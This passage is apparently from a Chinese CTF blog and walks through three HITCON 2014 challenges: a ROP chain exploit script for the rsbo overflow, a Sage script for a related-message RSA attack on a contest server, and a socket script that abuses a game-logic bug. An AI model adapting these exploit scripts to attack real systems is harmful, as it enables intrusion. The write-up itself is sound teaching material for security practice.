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" alt>  eip之后还有16bytes可用，考虑到栈不可执行，所以使用ROP方式，依次调用open，read，write来打开读取flag再写出，flag的路径在init函数中已经有了。 这边有两种思路，第一种就利用之后的16byte，因为空间很小，所以一次就调用一个函数，先调用open，之后ret回main。再次输入再次溢出时调用read，之后再次返回main，溢出后调用write 第二种就是先调用read或者read_80_bytes读入到.bss，之后ebp指向.bss进入ROP链 我是使用第二种，exp如下（没有网络通信部分）</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python2.7 </span></span><br><span class="line">\<span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">hitcon2014</span></span><br><span class="line"><span class="string">rsbo</span></span><br><span class="line"><span class="string">exp</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    junk = struct.pack(<span class="string">'&lt;I'</span>, <span class="number">0x00000000</span>)  * <span class="number">26</span></span><br><span class="line">    bss = struct.pack(<span class="string">'&lt;I'</span>, <span class="number">0x0804a040</span>)</span><br><span class="line">    read\_80\_byte = struct.pack(<span class="string">'&lt;I'</span>, <span class="number">0x0804865c</span>)</span><br><span class="line">    leave_ret = struct.pack(<span class="string">'&lt;I'</span>, <span class="number">0x0804867d</span>)</span><br><span class="line">    opep_pid = struct.pack(<span class="string">'&lt;I'</span>, <span class="number">0x08048420</span>)</span><br><span class="line">    read_pid = struct.pack(<span class="string">'&lt;I'</span>, <span class="number">0x080483e0</span>)</span><br><span class="line">    write_pid = struct.pack(<span class="string">'&lt;I'</span>, <span class="number">0x08048450</span>)</span><br><span class="line">    pppr = struct.pack(<span class="string">'&lt;I'</span>, <span class="number">0x0804879d</span>)</span><br><span class="line">    ppr = struct.pack(<span class="string">'&lt;I'</span>, <span class="number">0x0804879e</span>)</span><br><span class="line">    buf = struct.pack(<span class="string">'&lt;I'</span>, <span class="number">0x0804a080</span>)</span><br><span class="line">    read_size = struct.pack(<span class="string">'&lt;I'</span>, <span class="number">0x10</span>)</span><br><span class="line">    flag_path = struct.pack(<span class="string">'&lt;I'</span>, <span class="number">0x080487d0</span>)</span><br><span class="line">    fd = struct.pack(<span class="string">'&lt;I'</span>, <span class="number">0x3</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#send</span></span><br><span class="line">    payload1 = <span class="string">''</span></span><br><span class="line">    payload1 += junk</span><br><span class="line"></span><br><span class="line">    <span class="comment">#ebp</span></span><br><span class="line">    payload1 += bss</span><br><span class="line"></span><br><span class="line">    <span class="comment">#call read\_80\_byte</span></span><br><span class="line">    payload1 += read\_80\_byte</span><br><span class="line"></span><br><span class="line">    <span class="comment">#set esp=ebp=.bss</span></span><br><span class="line">    payload1 += leave_ret</span><br><span class="line"></span><br><span class="line">    <span class="comment">#read\_80\_byre arg1</span></span><br><span class="line">    payload1 += bss </span><br><span class="line"></span><br><span class="line">    <span class="comment">#junk</span></span><br><span class="line">    payload1 += struct.pack(<span class="string">'&lt;I'</span>,<span class="number">0x00</span>) *<span class="number">2</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#write to .bss</span></span><br><span class="line">    payload2 = <span class="string">''</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#ebp</span></span><br><span class="line">    payload2 += struct.pack(<span class="string">'&lt;I'</span>, <span class="number">0x00</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#open</span></span><br><span class="line">    payload2 += opep_pid </span><br><span class="line"></span><br><span class="line">    <span class="comment">#ppr</span></span><br><span class="line">    payload2 += ppr </span><br><span class="line"></span><br><span class="line">    <span class="comment">#open arg</span></span><br><span class="line">    payload2 += flag_path</span><br><span class="line">    payload2 += struct.pack(<span class="string">'&lt;I'</span>,<span class="number">0x00</span>) </span><br><span class="line"></span><br><span class="line">    <span class="comment">#read</span></span><br><span class="line">    payload2 += read_pid</span><br><span class="line">    <span class="comment">#pppr</span></span><br><span class="line">    payload2 += pppr</span><br><span class="line">    <span class="comment">#read arg</span></span><br><span class="line">    payload2 += fd</span><br><span class="line">    payload2 += buf</span><br><span class="line">    payload2 += read_size</span><br><span class="line"></span><br><span class="line">    <span class="comment">#write</span></span><br><span class="line">    payload2 += write_pid</span><br><span class="line">    <span class="comment">#****</span></span><br><span class="line">    payload2 += pppr</span><br><span class="line">    <span class="comment">#write arg</span></span><br><span class="line">    payload2 += struct.pack(<span class="string">'&lt;I'</span>,<span class="number">0x1</span>)</span><br><span class="line">    payload2 += buf</span><br><span class="line">    payload2 += read_size</span><br><span class="line"></span><br><span class="line">    payload = payload1 + payload2</span><br><span class="line">    <span class="keyword">print</span> payload</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> \_\_name\_\_ == <span class="string">'\_\_main\_\_'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
<h1 id="0x02-rsaha"><a href="#0x02-rsaha" class="headerlink" title="0x02 rsaha"></a>0x02 rsaha</h1><p>这个是利用RSA的低指数攻击 paper<a href="https://www.cs.unc.edu/%7Ereiter/papers/1996/Eurocrypt.pdf" target="_blank" rel="noopener">https://www.cs.unc.edu/~reiter/papers/1996/Eurocrypt.pdf</a> 用到了sage <a href="http://www.sagemath.org/" target="_blank" rel="noopener">http://www.sagemath.org/</a></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_m</span><span class="params">(n,c1,c2)</span>:</span></span><br><span class="line">    e=<span class="number">3</span></span><br><span class="line">    x = PolynomialRing(ZZ.quo(n*ZZ), <span class="string">'x'</span>).gen()</span><br><span class="line">    f=x**e-c1</span><br><span class="line">    g=(x+<span class="number">1</span>)**e-c2</span><br><span class="line">    a = f</span><br><span class="line">    b = g</span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        r = a % b</span><br><span class="line">        <span class="comment">#print i</span></span><br><span class="line">        <span class="keyword">if</span> r == <span class="number">0</span>:</span><br><span class="line">            <span class="comment">#print 'FOUND %s' % rp</span></span><br><span class="line">            c = rp.coeffs()</span><br><span class="line">            <span class="keyword">return</span> int(-pow(c\[<span class="number">1</span>\], <span class="number">-1</span>, n) * c\[<span class="number">0</span>\])</span><br><span class="line">        rp = r</span><br><span class="line">        a, b = b, r</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">sock = socket.socket(socket.AF\_INET, socket.SOCK\_STREAM)</span><br><span class="line">sock.connect((<span class="string">'54.64.40.172'</span>, <span class="number">5454</span>))</span><br><span class="line"></span><br><span class="line">recv = sock.recv(<span class="number">100000</span>)</span><br><span class="line"><span class="keyword">print</span> repr(recv)</span><br><span class="line">n = int(recv)</span><br><span class="line">recv = sock.recv(<span class="number">100000</span>)</span><br><span class="line">c = recv.split(<span class="string">'n'</span>)</span><br><span class="line">c1 = int(c\[<span class="number">1</span>\])</span><br><span class="line">c2 = int(c\[<span class="number">2</span>\])</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">'n:%d'</span> % n</span><br><span class="line"><span class="keyword">print</span> <span class="string">'c1:%d'</span> % c1</span><br><span class="line"><span class="keyword">print</span> <span class="string">'c2:%d'</span> % c2</span><br><span class="line"></span><br><span class="line">m = get_m(n,c1,c2)</span><br><span class="line"><span class="keyword">print</span> m</span><br><span class="line">sock.send(<span class="string">"%dn"</span> % m)</span><br><span class="line"></span><br><span class="line">recv = sock.recv(<span class="number">100000</span>)</span><br><span class="line"><span class="keyword">print</span> repr(recv)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">9</span>):</span><br><span class="line">    recv = sock.recv(<span class="number">100000</span>)</span><br><span class="line">    <span class="keyword">print</span> repr(recv)</span><br><span class="line">    c = recv.split(<span class="string">'n'</span>)</span><br><span class="line">    <span class="keyword">print</span> c</span><br><span class="line">    n = int(c\[<span class="number">1</span>\])</span><br><span class="line">    c1 = int(c\[<span class="number">2</span>\])</span><br><span class="line">    c2 = int(c\[<span class="number">3</span>\])</span><br><span class="line"></span><br><span class="line">    <span class="keyword">print</span> <span class="string">'n:%d'</span> % n</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'c1:%d'</span> % c1</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'c2:%d'</span> % c2</span><br><span class="line"></span><br><span class="line">    m = get_m(n,c1,c2)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'m:%d'</span> % m</span><br><span class="line">    sock.send(<span class="string">"%dn"</span> % m)</span><br><span class="line"></span><br><span class="line">    recv = sock.recv(<span class="number">100000</span>)</span><br><span class="line">    <span class="keyword">print</span> repr(recv)</span><br></pre></td></tr></table></figure>
<h1 id="0x03-finger"><a href="#0x03-finger" class="headerlink" title="0x03 finger"></a>0x03 finger</h1><p>是ginger的简单版，因为出题人留bug了所以变简单了。。 分析程序，一开始出3个字符串，自己选一个，BOSS选一个。 三个字符串是循环取胜的关系，相当于要跟boss比猜拳。 你先选一个，然后发送这个字符串开头的16位字符串的md5给它，然后boss告诉你它选了什么，之后你再发你选了什么。比胜负。 那个验证的部分我说的简单了，ginger就是要绕过这个验证部分。 finger的话有个bug。如果你作弊了，就是前后不一的话扣1血。你赢了boss它扣1-3血，所以总是可以赢的。 下面是代码</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python2.7  </span></span><br><span class="line">\<span class="comment"># -*- coding: utf-8 -*- </span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">Created on 2014年8月17日</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">@author: yf</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> md5</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_md5</span><span class="params">(hand)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> int(md5.md5(hand).hexdigest(),<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> \_\_name\_\_ == <span class="string">'\_\_main\_\_'</span>:</span><br><span class="line">    sock = socket.socket(socket.AF\_INET, socket.SOCK\_STREAM)</span><br><span class="line">    sock.connect((<span class="string">'210.71.253.236'</span>,<span class="number">7171</span>))</span><br><span class="line"></span><br><span class="line">    <span class="comment">#round num</span></span><br><span class="line">    recv = sock.recv(<span class="number">1024</span>)</span><br><span class="line"></span><br><span class="line">    recv = sock.recv(<span class="number">1024</span>)</span><br><span class="line">    recv = recv.split(<span class="string">'n'</span>)</span><br><span class="line">    hands=\[\]</span><br><span class="line">    <span class="keyword">print</span> recv\[<span class="number">3</span>\]\[<span class="number">9</span>:\]</span><br><span class="line">    hands = eval (recv\[<span class="number">3</span>\]\[<span class="number">9</span>:\])</span><br><span class="line">    secret = hands\[<span class="number">2</span>\]+<span class="string">'11111111111'</span></span><br><span class="line">    sock.send(<span class="string">"1n"</span>)</span><br><span class="line">    recv = sock.recv(<span class="number">1024</span>)</span><br><span class="line">    <span class="keyword">print</span> recv</span><br><span class="line">    sock.send(<span class="string">"%dn"</span> % get_md5(secret))</span><br><span class="line"></span><br><span class="line">    time.sleep(<span class="number">2</span>)</span><br><span class="line">    recv = sock.recv(<span class="number">1024</span>)</span><br><span class="line">    <span class="keyword">print</span> recv</span><br><span class="line">    his_hand = recv\[recv.find(<span class="string">'e:'</span>)+<span class="number">3</span>:recv.find(<span class="string">'e:'</span>)+<span class="number">8</span>\]</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'HIS:'</span>+his_hand</span><br><span class="line">    <span class="keyword">if</span> his_hand==hands\[<span class="number">0</span>\]:</span><br><span class="line">        sock.send(<span class="string">'111n'</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        sock.send(secret+<span class="string">'n'</span>)</span><br><span class="line">    recv = sock.recv(<span class="number">1024</span>)</span><br><span class="line">    <span class="keyword">print</span> recv</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        <span class="comment">#new round</span></span><br><span class="line">        time.sleep(<span class="number">0.5</span>)</span><br><span class="line">        recv = sock.recv(<span class="number">1024</span>)</span><br><span class="line">        <span class="keyword">print</span> recv</span><br><span class="line">        recv = recv.split(<span class="string">'n'</span>)</span><br><span class="line">        <span class="keyword">print</span> recv</span><br><span class="line"></span><br><span class="line">        hands = eval (recv\[<span class="number">4</span>\]\[<span class="number">9</span>:\])</span><br><span class="line">        secret = hands\[<span class="number">2</span>\]+<span class="string">'11111111111'</span></span><br><span class="line">        sock.send(<span class="string">"1n"</span>)</span><br><span class="line">        recv = sock.recv(<span class="number">1024</span>)</span><br><span class="line">        <span class="keyword">print</span> recv</span><br><span class="line">        sock.send(<span class="string">"%dn"</span> % get_md5(secret))</span><br><span class="line">        time.sleep(<span class="number">2</span>)</span><br><span class="line">        recv = sock.recv(<span class="number">1024</span>)</span><br><span class="line">        <span class="keyword">print</span> recv</span><br><span class="line">        his_hand = recv\[recv.find(<span class="string">'e:'</span>)+<span class="number">3</span>:recv.find(<span class="string">'e:'</span>)+<span class="number">8</span>\]</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'HIS:'</span>+his_hand</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> his_hand==hands\[<span class="number">0</span>\]:</span><br><span class="line">            sock.send(<span class="string">'111n'</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            sock.send(secret+<span class="string">'n'</span>)</span><br><span class="line">        recv = sock.recv(<span class="number">1024</span>)</span><br><span class="line">        <span class="keyword">print</span> recv</span><br></pre></td></tr></table></figure>
                    
                        


                    
                    
                        <p>
                            <a
                                href="/writeups/hitcon-ctf-2014-rsbo-finger-rsaha-writeup/#post-footer"
                                class="postShorten-excerpt_link link"
                                aria-label=""
                            >
                                Comment and share
                            </a>
                        </p>
                    
                </div>
            
        </div>
        
    </article>
    
    <div class="pagination-bar">
    <ul class="pagination">
        
        
        <li class="pagination-number">page 1 of 1</li>
    </ul>
</div>

</section>


                <footer id="footer" class="main-content-wrap">
    <span class="copyrights">
        Copyrights &copy; 2025 Eadom. All Rights Reserved.
    </span>
</footer>

            </div>
            
        </div>
        


    
        
    

<div id="about">
    <div id="about-card">
        <div id="about-btn-close">
            <i class="fa fa-times"></i>
        </div>
        
            <img id="about-card-picture" src="/assets/images/avatar.jpg" alt="Author&#39;s picture"/>
        
            <h4 id="about-card-name">Eadom</h4>
        
            <div id="about-card-bio"><p>NO PWN NO FUN</p>
</div>
        
        
            <div id="about-card-job">
                <i class="fa fa-briefcase"></i>
                <br/>
                <p>@Alibaba</p>

            </div>
        
        
            <div id="about-card-location">
                <i class="fa fa-map-marker-alt"></i>
                <br/>
                Hangzhou
            </div>
        
    </div>
</div>

        
        
<div id="cover" style="background-image:url('/assets/images/cover.png');"></div>
        <!--SCRIPTS-->
<script src="/assets/js/script-rmcrjyesoiaq5zeyncix4j3bagwy19cwj9vg041guvn2zdknk0vkkwd3bneh.min.js"></script>
<!--SCRIPTS END-->





    </body>
</html>
